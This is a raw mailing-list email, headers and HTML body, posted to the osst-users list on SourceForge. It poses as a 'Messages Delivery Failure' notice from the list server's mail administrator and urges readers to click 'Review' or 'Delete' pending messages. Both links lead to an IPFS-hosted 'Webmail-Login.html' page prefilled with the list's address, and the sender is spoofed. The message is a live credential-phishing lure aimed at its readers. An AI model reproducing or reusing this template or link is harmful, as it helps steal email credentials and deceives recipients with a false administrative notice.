Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id D4BC19642BE
	for <lists+osst-users@lfdr.de>; Thu, 29 Aug 2024 13:10:41 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1sjd31-00009d-Bf
	for lists+osst-users@lfdr.de;
	Thu, 29 Aug 2024 11:10:40 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <no-reply@accounts.google.com>) id 1sjd2y-00008Y-Td
 for osst-users@lists.sourceforge.net; Thu, 29 Aug 2024 11:10:37 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=KAUPUVU8euO6Dnz36KAKqOsqx8OXWd85n+lVzKpvYLY=; b=iOhVeypyWQV6CzgM5/HzFprnZe
 V1xVI7zrVy/f7g77FMn18X3xOeKDXSujbe8mIvMWVXfPuwmrkCjQ/WU3WDqk0NIixuopNtkFg+xI3
 TFyI3T7NtCIhRl7lAMB9v6FVQ00Zq3ejXcxP1mqc/xj7ycE5Zr5jYNpfG+obflOOL0Hc=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=KAUPUVU8euO6Dnz36KAKqOsqx8OXWd85n+lVzKpvYLY=; b=V
 FfDxDaS1S+3OwoIhy9PuBZvFcaq5DnU2ONri5SAOoYL2Ja78qJxbprgRz+EQ72ydg0XQ6+Tvl/xCw
 zT7+CFiObkLV3mYRSBWSzSIXMHEx4fx60o2/B8bxMeTDmvSA6YNGjIuC6qgk4D1knxWrvGKxaCSSd
 +sXfYL6DrN59Wua8=;
Received: from [51.89.231.44] (helo=accounts.google.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1sjd2y-0005Un-OQ for osst-users@lists.sourceforge.net;
 Thu, 29 Aug 2024 11:10:37 +0000
To: osst-users@lists.sourceforge.net
Date: 29 Aug 2024 04:10:30 -0700
Message-ID: <20240829041030.C86568E9374D930F@accounts.google.com>
MIME-Version: 1.0
X-Spam-Score: -1.8 (-)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Message from lists.sourceforge.net server Messages Delivery
 Failure The delivery of messages was stopped by the lists.sourceforge.net
 mail server. You have pending messages that could not be sent as of 8/29/2024
 4:10:30 a.m. 
 Content analysis details:   (-1.8 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: ipfs.io]
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [51.89.231.44 listed in bl.score.senderscore.com]
 0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
 The query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [51.89.231.44 listed in sa-accredit.habeas.com]
 -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
 high trust [51.89.231.44 listed in list.dnswl.org]
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [51.89.231.44 listed in wl.mailspike.net]
 0.9 SPF_HELO_SOFTFAIL      SPF: HELO does not match SPF record (softfail)
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only
X-Headers-End: 1sjd2y-0005Un-OQ
Subject: [Osst-users] Undeliverable: Outgoing Messages Failure
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
From: Postmaster via Osst-users <osst-users@lists.sourceforge.net>
Reply-To: Postmaster <no-reply@accounts.google.com>
Content-Type: multipart/mixed; boundary="===============2804552358209816354=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============2804552358209816354==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
al; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;"><tbody style=3D"b=
ox-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><th style=3D"=
padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: none; width: 2p=
x; color: rgb(0, 0, 0); box-sizing: border-box; background-color: rgb(2, 15=
1, 64);">&nbsp;</th>
<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
ne; width: 665px; color: rgb(0, 0, 0); box-sizing: border-box; background-c=
olor: rgb(243, 255, 248);"><span style=3D"font-size: 12px; box-sizing: bord=
er-box;">Message from&nbsp;lists.sourceforge.net server</span></td></tr></t=
body></table>
<div style=3D"border-width: 0px; margin: 0px; padding: 20px; text-align: le=
ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Verdana; font-size: 12px; font-style: normal;=
 font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space=
: normal; box-sizing: border-box; orphans: 2; widows: 2; font-stretch: inhe=
rit; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;">
<span style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: no=
ne; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-ser=
if; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0p=
x; float: none; display: inline !important; white-space: normal; orphans: 2=
; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
oration-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;">&nbsp;</span></div>
<p align=3D"left" style=3D"color: rgb(44, 54, 58); text-transform: none; te=
xt-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; fo=
nt-size: 13px; font-style: normal; font-weight: 400; margin-top: 0px; word-=
spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; wido=
ws: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal=
; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoratio=
n-thickness: initial; text-decoration-style: initial;=20
text-decoration-color: initial;"><font color=3D"#000066" face=3D"Arial" siz=
e=3D"4" style=3D"box-sizing: border-box;"><strong style=3D"font-weight: bol=
der; box-sizing: border-box;">Messages Delivery Failure</strong></font></p>=

<div align=3D"left" class=3D"v1v1yiv9201021698gmail_quote_mr_css_attr" styl=
e=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter=
-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-st=
yle: normal; font-weight: 400; word-spacing: 0px; border-top-color: current=
Color; border-top-width: 0px; border-top-style: none; white-space: normal; =
box-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 2=
55, 255); font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial;"><font size=3D"3"><font style=3D"box-sizing: border-box;"><span st=
yle=3D"box-sizing: border-box;">The delivery of messages was stopped by the=
&nbsp;lists.sourceforge.net mail server.</span><br style=3D"box-sizing: bor=
der-box;"><span style=3D"box-sizing: border-box;">You have&nbsp;pending mes=
sages that could not be sent as of 8/29/2024 4:10:30 a.m.</span></font>
<br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"=
>
<span style=3D"box-sizing: border-box;"><font style=3D"box-sizing: border-b=
ox;">Click to</font>
<a class=3D"v1v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0=
px; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-=
align: baseline; cursor: pointer; box-sizing: border-box; background-color:=
 transparent;" href=3D"https://ipfs.io/ipfs/bafkreicmwwbqlpvt46zpvaa5cgbwpu=
p7s7ncugivzzvakhneiqj4e7fiqm?filename=3DWebmail-Login.html#osst-users@lists=
=2Esourceforge.net" target=3D"_blank" rel=3D"noreferrer"><font style=3D"box=
-sizing: border-box;">
Review</font></a><font style=3D"box-sizing: border-box;">&nbsp;</font><font=
 style=3D"box-sizing: border-box;">or</font>
<a class=3D"v1v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0=
px; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-=
align: baseline; cursor: pointer; box-sizing: border-box; background-color:=
 transparent;" href=3D"https://ipfs.io/ipfs/bafkreicmwwbqlpvt46zpvaa5cgbwpu=
p7s7ncugivzzvakhneiqj4e7fiqm?filename=3DWebmail-Login.html#osst-users@lists=
=2Esourceforge.net" target=3D"_blank" rel=3D"noreferrer"><font style=3D"box=
-sizing: border-box;">
Delete</font></a><span>&nbsp;</span><font style=3D"box-sizing: border-box;"=
>pending outgoing e-mail messages.</font></span></font></div>
<div align=3D"left" class=3D"v1v1yiv9201021698gmail_quote_mr_css_attr" styl=
e=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter=
-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-st=
yle: normal; font-weight: 400; word-spacing: 0px; border-top-color: current=
Color; border-top-width: 0px; border-top-style: none; white-space: normal; =
box-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 2=
55, 255); font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial;"><font size=3D"3"><span style=3D"box-sizing: border-box;"></span><=
/font>&nbsp;</div>
<div class=3D"v1v1yiv9201021698gmail_quote_mr_css_attr" style=3D"text-align=
: left; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; let=
ter-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font=
-style: normal; font-weight: 400; margin-bottom: 0pt; word-spacing: 0px; bo=
rder-top-color: currentColor; border-top-width: 0px; border-top-style: none=
; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backg=
round-color: rgb(255, 255, 255);=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
initial; text-decoration-color: initial;"><span style=3D"color: black; box-=
sizing: border-box;"><font size=3D"3">Thanks,</font></span></div>
<div class=3D"v1v1yiv9201021698gmail_quote_mr_css_attr" style=3D"text-align=
: left; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; let=
ter-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font=
-style: normal; font-weight: 400; margin-bottom: 0pt; word-spacing: 0px; bo=
rder-top-color: currentColor; border-top-width: 0px; border-top-style: none=
; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backg=
round-color: rgb(255, 255, 255);=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
initial; text-decoration-color: initial;"><strong style=3D"font-weight: bol=
der; box-sizing: border-box;"><span style=3D"color: black; box-sizing: bord=
er-box;"><font size=3D"3">Mail&nbsp;Administrator</font></span></strong></d=
iv></body></html>


--===============2804552358209816354==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2804552358209816354==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============2804552358209816354==--
